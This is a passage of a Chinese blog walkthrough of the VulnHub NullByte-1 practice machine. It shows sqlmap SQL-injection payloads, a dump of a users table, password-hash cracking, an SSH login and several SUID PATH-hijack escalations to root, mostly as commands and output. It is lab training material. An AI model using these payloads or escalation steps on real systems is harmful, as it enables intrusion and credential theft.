class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] testing &#x27;</span>MySQL UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] &#x27;</span>ORDER BY<span class="string">&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] target URL appears to have 3 columns in query</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is &#x27;</span>MySQL UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:42:03] [WARNING] in OR boolean-based injection cases, please consider usage of switch &#x27;</span>--drop-set-cookie<span class="string">&#x27; if you experience any problems during data retrieval</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 137 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: usrtosearch (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; OR NOT 7451=7451#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a6a6271,(SELECT (ELT(9768=9768,1))),0x7171627171,0x78))s), 8446744073709551610, 8446744073709551610)))-- Irce</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; AND (SELECT 7630 FROM (SELECT(SLEEP(5)))fzHD)-- xAIX</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6271,0x7a5249786a7646744654494a6d676f4c78454f63675a7a4d786f757a42744a515649526e7574704b,0x7171627171)#</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.5</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] fetched data logged to text files under &#x27;</span>C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.56.106<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:42:03 /2020-01-02/</span></span><br></pre></td></tr></table></figure>
+
+<p>查找其中的用户名和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D seth -T users --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [.]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 21:53:36 /2020-01-01/</span><br><span class="line"></span><br><span class="line">[21:53:36] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[21:53:36] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[21:53:36] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: usrtosearch (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: usrtosearch=1111<span class="string">&quot; OR NOT 8608=8608#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot;</span> AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(<span class="number">0</span>x716b767671,(SELECT (ELT(<span class="number">6518</span>=<span class="number">6518</span>,<span class="number">1</span>))),0x7171706b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- SFDc</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: usrtosearch=1111<span class="string">&quot; AND (SELECT 5358 FROM (SELECT(SLEEP(5)))oBUJ)-- bKCB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot;</span> UNION ALL SELECT NULL,CONCAT(0x716b767671,0x564b5772465344646f7a6a79776666466b735572476570706b70585a4a704d624f704e54684f5172,0x7171706b71),NULL<span class="comment">#</span></span><br><span class="line">---</span><br><span class="line">[21:53:36] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.5</span><br><span class="line">[21:53:36] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;seth&#x27;</span></span><br><span class="line">[21:53:36] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;seth&#x27;</span></span><br><span class="line">Database: seth</span><br><span class="line">Table: <span class="built_in">users</span></span><br><span class="line">[2 entries]</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line">| <span class="built_in">id</span> | pass                                        | user   | position   |</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line">| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |</span><br><span class="line">| 2  | --not allowed--                             | isis   | employee   |</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line"></span><br><span class="line">[21:53:36] [INFO] table <span class="string">&#x27;seth.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.sqlmap/output/192.168.56.106/dump/seth/users.csv&#x27;</span>                                                                                             </span><br><span class="line">[21:53:36] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.sqlmap/output/192.168.56.106&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:53:36 /2020-01-01/</span><br></pre></td></tr></table></figure>
+
+<p>得到ramses&#x2F;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE，先将字符串YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE解密，得到c6d6bd7ebf806f43c76acc3681703bODE然后在在线网站上将hash解密，得到值omega</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub124.jpg"></p>
+<p>有了username和password，下面就是ssh连接</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用ramses&#x2F;omega连接ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ramses@192.168.56.106 -p 777</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.56.106]:777 ([192.168.56.106]:777)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:H/Y/TKggtnCfMGz457Jy6F6tUZPrvEDD62dP9A3ZIkU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.56.106]:777<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">ramses@192.168.56.106&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109</span><br><span class="line">ramses@NullByte:~$ <span class="built_in">id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) <span class="built_in">groups</span>=1002(ramses)</span><br><span class="line">ramses@NullByte:~$ <span class="built_in">whoami</span></span><br><span class="line">ramses</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>查看具有SUID权限的二进制文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/var/www/backup/procwatch</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+
+<p>发现&#x2F;var&#x2F;www&#x2F;backup&#x2F;procwatch的SUID位已启用，非常吸引人。 进一步探索它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:~$ <span class="built_in">cd</span> /var/www/backup/</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">ls</span></span><br><span class="line">procwatch  readme.txt</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">cat</span> readme.txt </span><br><span class="line">I have to fix this mess... </span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch </span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1664 pts/0    00:00:00 procwatch</span><br><span class="line"> 1665 pts/0    00:00:00 sh</span><br><span class="line"> 1666 pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure>
+
+<p>ummm,没有变成root用户，看来还需要做点什么<br>因此，当运行上述命令时，看起来procwatch文件正在尝试运行ps，这是&#x2F;bin内用于处理状态的真实文件。 作者在这里可以考虑的最重要的事情是，作者已将procwatch的SUID位设置为ON，并且可能是调用系统功能（例如ps）的任何小程序文件。<br>利用它的优势，可以升级root特权并实现root该VM。 将必须操作环境PATH变量。 如果可以使procwatch运行sh而不是ps，它应该返回一个root shell。 以下使用环境$ PATH变量及其操作环境变量的方法称为Linux特权升级。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span>  &gt; ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">chmod</span> 777 ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) <span class="built_in">groups</span>=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<p>成功提权，帅呆了,提权方法太帅，记下来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">./procwatch</span><br></pre></td></tr></table></figure>
+<ul>
+<li>$PATH中的“.”，表示用户能够从当前目录执行二进制文件&#x2F;脚本。 通过执行以上命令，将获取root权限。</li>
+</ul>
+<p><font color="red">找到flag</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="comment"># cat proof.txt </span></span><br><span class="line">adf11c7a9e6523e630aaf3b9b7acb51d</span><br><span class="line"></span><br><span class="line">It seems that you have pwned the box, congrats. </span><br><span class="line">Now you <span class="keyword">done</span> that I wanna talk with you. Write a walk &amp; mail at</span><br><span class="line">xly0n@sigaint.org attach the walk and proof.txt</span><br><span class="line">If sigaint.org is down you may mail at nbsly0n@gmail.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USE THIS PGP PUBLIC KEY</span><br><span class="line"></span><br><span class="line">-----BEGIN PGP PUBLIC KEY BLOCK-----</span><br><span class="line">Version: BCPG C<span class="comment"># v1.6.1.0</span></span><br><span class="line"></span><br><span class="line">mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ</span><br><span class="line">Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT</span><br><span class="line">e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq</span><br><span class="line">Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK</span><br><span class="line">+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe</span><br><span class="line">YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu</span><br><span class="line">Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS</span><br><span class="line">HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q</span><br><span class="line">m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn</span><br><span class="line">XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58</span><br><span class="line">kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8</span><br><span class="line">TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU</span><br><span class="line">Gms=</span><br><span class="line">=PiAQ</span><br><span class="line">-----END PGP PUBLIC KEY BLOCK-----</span><br></pre></td></tr></table></figure>
+
+<p>将adf11c7a9e6523e630aaf3b9b7acb51d解密，结果是welldone22</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub125.jpg"></p>
+<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">cp</span> /bin/sh /tmp/ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">export</span> PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) <span class="built_in">groups</span>=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权3"><a href="#提权3" class="headerlink" title="提权3"></a>提权3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ramses@NullByte:/tmp$ nano ps</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">chmod</span> 777 ps</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">ramses@NullByte:/tmp$ <span class="built_in">cd</span> /var/www/backup</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) <span class="built_in">groups</span>=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/01/02/NullByte-1/" title="vulnhub靶机渗透[NullByte-1]">https://fdlucifer.github.io/2020/01/02/NullByte-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/12/31/Os-hackNos-3/" rel="prev" title="vulnhub靶机渗透[Os-hackNos-3]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[Os-hackNos-3]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/01/02/Mr-Robot-1/" rel="next" title="vulnhub靶机渗透[Mr-Robot-1]">
+                  vulnhub靶机渗透[Mr-Robot-1] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
